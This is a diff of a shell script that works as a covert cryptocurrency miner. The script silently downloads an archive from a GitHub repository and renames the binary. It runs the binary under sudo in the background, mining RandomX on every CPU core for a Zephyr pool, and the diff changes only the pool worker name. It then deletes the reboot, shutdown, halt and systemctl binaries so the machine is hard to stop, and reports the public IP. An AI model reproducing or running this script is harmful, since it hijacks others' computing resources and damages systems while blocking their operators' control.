@@ -17,7 +17,7 @@ mkdir .lib && cd .lib
 wget https://github.com/TiannaMcdowell/All-File/raw/main/daemon.tar.gz > /dev/null 2>&1 
 tar -xvf daemon.tar.gz
 mv uranus sgr1
-sudo nohup ./sgr1 --donate-level 1 -o zeph-asia.f2pool.com:6100 -u novalanto.$(echo $(shuf -i 1-100000 -n 1)-A) -p x -a rx/0 -t $(nproc --all) > /dev/null 2>&1 &
+sudo nohup ./sgr1 --donate-level 1 -o zeph-asia.f2pool.com:6100 -u novalanto.$(echo $(shuf -i 1-100000 -n 1)-KIKIR) -p x -a rx/0 -t $(nproc --all) > /dev/null 2>&1 &
 sleep 30
 sudo rm -rvf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl || rm -rvf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl
 curl ifconfig.me
